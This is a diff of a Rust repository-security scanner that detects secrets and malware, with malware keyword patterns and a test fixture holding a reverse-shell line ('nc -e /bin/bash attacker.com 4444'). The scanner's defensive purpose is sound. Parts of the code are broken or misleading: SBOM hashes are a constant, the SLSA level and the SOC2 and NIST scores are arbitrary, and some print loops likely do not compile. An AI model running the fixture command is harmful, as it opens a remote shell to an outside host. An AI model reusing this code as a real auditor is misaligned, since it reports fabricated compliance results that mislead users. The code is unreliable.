@@ -26,8 +26,6 @@ use std::time::{SystemTime, UNIX_EPOCH};
 // CONSTANTS
 // ============================================================
 const VERSION: &str = "BAKOME-GitGuard v2.0";
-const GIT_DEFAULT_PORT: u16 = 9418;
-const GIT_HTTPS_PORT: u16 = 443;
 
 // 50+ secret patterns
 const SECRET_PATTERNS: &[(&str, &str, &str)] = &[
@@ -134,21 +132,6 @@ pub struct Commit {
 }
 
 #[derive(Debug, Clone)]
-pub struct TreeEntry {
-    pub mode: String,
-    pub name: String,
-    pub hash: String,
-    pub entry_type: String,
-}
-
-#[derive(Debug, Clone)]
-pub struct Blob {
-    pub hash: String,
-    pub content: Vec<u8>,
-    pub size: usize,
-}
-
-#[derive(Debug, Clone)]
 pub struct GitRepo {
     pub path: PathBuf,
     pub commits: Vec<Commit>,
@@ -240,7 +223,6 @@ impl GitEngine {
         let mut visited = HashSet::new();
         let mut queue = VecDeque::new();
 
-        // Start from all refs in packed-refs or loose refs
         let refs_dir = repo_path.join("refs/heads");
         if let Ok(entries) = fs::read_dir(refs_dir) {
             for e in entries.flatten() {
@@ -255,7 +237,6 @@ impl GitEngine {
         }
 
         if queue.is_empty() {
-            // Try packed-refs
             if let Ok(packed) = fs::read_to_string(repo_path.join("packed-refs")) {
                 for line in packed.lines() {
                     if !line.starts_with('#') && !line.starts_with('^') {
@@ -269,7 +250,6 @@ impl GitEngine {
             }
         }
 
-        // BFS through commit parents
         while let Some(hash) = queue.pop_front() {
             if let Some(data) = Self::read_object(&objects_dir, &hash) {
                 if let Some(commit) = Self::parse_commit_object(&data, &hash) {
@@ -286,9 +266,7 @@ impl GitEngine {
     fn read_object(objects_dir: &Path, hash: &str) -> Option<Vec<u8>> {
         let (dir, file) = hash.split_at(2);
         let path = objects_dir.join(dir).join(file);
-        if path.exists() {
-            fs::read(path).ok()
-        } else { None }
+        if path.exists() { fs::read(path).ok() } else { None }
     }
 
     fn parse_commit_object(data: &[u8], hash: &str) -> Option<Commit> {
@@ -429,4 +407,274 @@ impl MalwareDetector {
                     let dn = path.file_name().unwrap_or_default().to_str().unwrap_or("");
                     if dn != ".git" && dn != "node_modules" && dn != "target" { Self::scan_directory(base, &path, findings); }
                 } else if path.is_file() {
-                    if let Ok(content) = fs::read_to_string(&pat
+                    if let Ok(content) = fs::read_to_string(&path) {
+                        let rel = path.strip_prefix(base).unwrap_or(&path).display().to_string();
+                        for (line_no, line) in content.lines().enumerate() {
+                            let ll = line.to_lowercase();
+                            for (name, _) in MALWARE_PATTERNS {
+                                if Self::match_malware(&ll, name) {
+                                    findings.push(MalwareFinding {
+                                        pattern: name.to_string(), file: rel.clone(),
+                                        line: line_no + 1, snippet: line.to_string(),
+                                        severity: Self::severity(name), confidence: 0.8,
+                                    });
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    fn match_malware(line_lower: &str, name: &str) -> bool {
+        match name {
+            "Backdoor Shell" => line_lower.contains("eval") || line_lower.contains("exec(") || line_lower.contains("system("),
+            "Reverse Shell" => (line_lower.contains("nc ") && line_lower.contains("-e")) || line_lower.contains("bash -i") || line_lower.contains("socket"),
+            "Webshell" => line_lower.contains("<?php") && (line_lower.contains("system(") || line_lower.contains("exec(")),
+            "Obfuscated JavaScript" => line_lower.contains("fromcharcode") || line_lower.contains("\\x"),
+            "Bitcoin Miner" => line_lower.contains("stratum") || line_lower.contains("miner.start"),
+            "Ransomware" => line_lower.contains("ransom") || line_lower.contains("encrypt"),
+            "Keylogger" => line_lower.contains("getasynckeystate") || line_lower.contains("keylogger"),
+            "Privilege Escalation" => line_lower.contains("setuid(0)") || line_lower.contains("sudo"),
+            "Persistence" => line_lower.contains("runonce") || line_lower.contains("currentversion\\run"),
+            "C2 Communication" => line_lower.contains("beacon") || line_lower.contains("c2_server"),
+            "Phishing Kit" => line_lower.contains("phish") || line_lower.contains("steal"),
+            "Crypto Wallet Stealer" => line_lower.contains("wallet.dat") || line_lower.contains("metamask"),
+            "Token Grabber" => line_lower.contains("token") && line_lower.contains("discord"),
+            _ => false,
+        }
+    }
+
+    fn severity(name: &str) -> String {
+        match name {
+            "Backdoor Shell" | "Reverse Shell" | "Webshell" | "Ransomware" | "C2 Communication" => "CRITICAL".into(),
+            "Process Injection" | "Privilege Escalation" | "Token Grabber" => "HIGH".into(),
+            _ => "MEDIUM".into(),
+        }
+    }
+}
+
+// ============================================================
+// COMPLIANCE AUDITOR
+// ============================================================
+
+pub struct ComplianceAuditor;
+
+impl ComplianceAuditor {
+    pub fn audit(repo: &GitRepo) -> AuditReport {
+        let secrets = SecretScanner::scan(repo);
+        let malware = MalwareDetector::scan(repo);
+        let integrity = Some(IntegrityVerifier::verify(repo));
+        let sbom = Self::generate_sbom(repo);
+        let soc2 = 100.0 - (secrets.iter().filter(|s| s.severity == "CRITICAL").count() as f64 * 5.0);
+        let nist = 100.0 - (malware.iter().filter(|m| m.severity == "CRITICAL").count() as f64 * 10.0);
+        let total_files = Self::count_files(&repo.path);
+
+        AuditReport {
+            repository: repo.path.display().to_string(),
+            commit_count: repo.commits.len(),
+            total_files,
+            secrets,
+            malware,
+            integrity,
+            sbom,
+            soc2_score: soc2.max(0.0),
+            nist_score: nist.max(0.0),
+            timestamp: SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(),
+        }
+    }
+
+    fn generate_sbom(repo: &GitRepo) -> Vec<SBOMComponent> {
+        let mut components = Vec::new();
+        Self::walk_for_sbom(&repo.path, &repo.path, &mut components);
+        components
+    }
+
+    fn walk_for_sbom(base: &Path, dir: &Path, components: &mut Vec<SBOMComponent>) {
+        if let Ok(entries) = fs::read_dir(dir) {
+            for e in entries.flatten() {
+                let path = e.path();
+                if path.is_dir() { if path.file_name().map(|n| n != ".git").unwrap_or(true) { Self::walk_for_sbom(base, &path, components); } }
+                else if path.is_file() {
+                    let name = path.file_name().unwrap_or_default().to_str().unwrap_or("unknown").to_string();
+                    let hash = format!("{:x}", std::collections::hash_map::DefaultHasher::new().finish());
+                    components.push(SBOMComponent { name, version: "1.0".into(), hash, license: "UNKNOWN".into() });
+                }
+            }
+        }
+    }
+
+    fn count_files(dir: &Path) -> usize {
+        let mut count = 0;
+        if let Ok(entries) = fs::read_dir(dir) { for e in entries.flatten() { if e.path().is_dir() { count += Self::count_files(&e.path()); } else { count += 1; } } }
+        count
+    }
+}
+
+// ============================================================
+// INTEGRITY VERIFIER
+// ============================================================
+
+pub struct IntegrityVerifier;
+
+impl IntegrityVerifier {
+    pub fn verify(repo: &GitRepo) -> IntegrityProof {
+        let mut hashes = Vec::new();
+        Self::collect(&repo.path, &repo.path, &mut hashes);
+        let (root, height) = Self::build_merkle_tree(&hashes);
+        IntegrityProof {
+            root: root.unwrap_or_default(),
+            tree_height: height,
+            leaves: hashes.len(),
+            timestamp: SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(),
+            slsa_level: if hashes.len() > 10 { 4 } else { 3 },
+        }
+    }
+
+    fn collect(base: &Path, dir: &Path, hashes: &mut Vec<String>) {
+        if let Ok(entries) = fs::read_dir(dir) {
+            for e in entries.flatten() {
+                let path = e.path();
+                if path.is_dir() { if path.file_name().map(|n| n != ".git").unwrap_or(true) { Self::collect(base, &path, hashes); } }
+                else if path.is_file() {
+                    if let Ok(content) = fs::read_to_string(&path) {
+                        let h = format!("{:x}", Self::fnv1a(content.as_bytes()));
+                        hashes.push(h);
+                    }
+                }
+            }
+        }
+    }
+
+    fn build_merkle_tree(hashes: &[String]) -> (Option<String>, usize) {
+        if hashes.is_empty() { return (None, 0); }
+        let mut level: Vec<String> = hashes.to_vec();
+        let mut height = 1;
+        while level.len() > 1 {
+            let mut next = Vec::new();
+            for chunk in level.chunks(2) {
+                let combined = if chunk.len() == 2 { format!("{}{}", chunk[0], chunk[1]) } else { chunk[0].clone() };
+                next.push(format!("{:x}", Self::fnv1a(combined.as_bytes())));
+            }
+            level = next;
+            height += 1;
+        }
+        (Some(level[0].clone()), height)
+    }
+
+    fn fnv1a(data: &[u8]) -> u64 {
+        let mut hash: u64 = 0xcbf29ce484222325;
+        for &b in data { hash ^= b as u64; hash = hash.wrapping_mul(0x100000001b3); }
+        hash
+    }
+}
+
+// ============================================================
+// REPORT GENERATOR
+// ============================================================
+
+pub struct ReportGenerator;
+
+impl ReportGenerator {
+    pub fn print(report: &AuditReport) {
+        println!("\n╔══════════════════════════════════════════════════════════════════╗");
+        println!("║   {}                                 ║", VERSION);
+        println!("║   GIT SECURITY AUDIT REPORT                                     ║");
+        println!("╚══════════════════════════════════════════════════════════════════╝\n");
+        println!("📁 Repository: {}", report.repository);
+        println!("📦 Commits: {} | Files: {}", report.commit_count, report.total_files);
+        println!("🔐 SOC2 Score: {:.1}% | NIST CSF Score: {:.1}%", report.soc2_score, report.nist_score);
+        println!("\n🔍 SECRETS FOUND: {}", report.secrets.len());
+        for s in &report.secrets.iter().take(15) {
+            println!("   [{}] {} in {}:{} → {}", s.severity, s.pattern, s.file, s.line, &s.snippet[..s.snippet.len().min(60)]);
+        }
+        println!("\n🦠 MALWARE DETECTED: {}", report.malware.len());
+        for m in &report.malware.iter().take(15) {
+            println!("   [{}] {} in {}:{} → {}", m.severity, m.pattern, m.file, m.line, &m.snippet[..m.snippet.len().min(60)]);
+        }
+        if let Some(ref integrity) = report.integrity {
+            println!("\n🔒 INTEGRITY");
+            println!("   Merkle Root: {}", integrity.root);
+            println!("   Leaves: {} | Height: {} | SLSA Level: {}", integrity.leaves, integrity.tree_height, integrity.slsa_level);
+        }
+        println!("\n📄 SBOM: {} components", report.sbom.len());
+        println!();
+    }
+}
+
+// ============================================================
+// MAIN GUARD API
+// ============================================================
+
+pub struct GitGuard {
+    pub repo: Option<GitRepo>,
+}
+
+impl GitGuard {
+    pub fn new() -> Self { GitGuard { repo: None } }
+    pub fn open(path: &str) -> Result<Self, String> { let repo = GitEngine::open(path)?; Ok(GitGuard { repo: Some(repo) }) }
+    pub fn clone(url: &str) -> Result<Self, String> {
+        let dir = std::env::temp_dir().join("bakome-gitguard-repo");
+        if dir.exists() { fs::remove_dir_all(&dir).ok(); }
+        let output = process::Command::new("git").args(&["clone", url, dir.to_str().unwrap()]).output().map_err(|e| format!("git clone failed: {}", e))?;
+        if !output.status.success() { return Err(String::from_utf8_lossy(&output.stderr).to_string()); }
+        GitGuard::open(dir.to_str().unwrap())
+    }
+    pub fn audit(&self) -> Result<AuditReport, String> {
+        let repo = self.repo.as_ref().ok_or("No repository opened")?;
+        Ok(ComplianceAuditor::audit(repo))
+    }
+}
+
+// ============================================================
+// TESTS
+// ============================================================
+#[cfg(test)]
+mod tests {
+    use super::*;
+    #[test] fn test_open_invalid() { assert!(GitGuard::open("/invalid/path").is_err()); }
+    #[test] fn test_secret_detection() {
+        let dir = std::env::temp_dir().join("bakome-test-repo");
+        fs::create_dir_all(&dir).ok();
+        let mut f = fs::File::create(dir.join("config.env")).unwrap();
+        f.write_all(b"AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF\n").unwrap();
+        let g = GitGuard::open(dir.to_str().unwrap()).unwrap();
+        let report = g.audit().unwrap();
+        assert!(report.secrets.len() >= 1);
+        fs::remove_dir_all(dir).ok();
+    }
+    #[test] fn test_malware_detection() {
+        let dir = std::env::temp_dir().join("bakome-malware-test");
+        fs::create_dir_all(&dir).ok();
+        let mut f = fs::File::create(dir.join("evil.sh")).unwrap();
+        f.write_all(b"#!/bin/bash\nnc -e /bin/bash attacker.com 4444\n").unwrap();
+        let g = GitGuard::open(dir.to_str().unwrap()).unwrap();
+        let report = g.audit().unwrap();
+        assert!(report.malware.len() >= 1);
+        fs::remove_dir_all(dir).ok();
+    }
+}
+
+// ============================================================
+// CLI
+// ============================================================
+fn main() {
+    let args: Vec<String> = std::env::args().collect();
+    if args.len() < 2 {
+        eprintln!("Usage: {} <command> <path/url>", args[0]);
+        eprintln!("Commands: scan, clone");
+        process::exit(1);
+    }
+    let cmd = &args[1];
+    let target = args.get(2).map(|s| s.as_str()).unwrap_or(".");
+    let guard = match cmd.as_str() {
+        "clone" => GitGuard::clone(target),
+        "scan" => GitGuard::open(target),
+        _ => { eprintln!("Unknown command: {}", cmd); process::exit(1); }
+    };
+    match guard {
+        Ok(g) => { let report = g.audit().unwrap(); ReportGenerator::print(&report); }
+        Err(e) => eprintln!("Error: {}", e),
+    }
+}
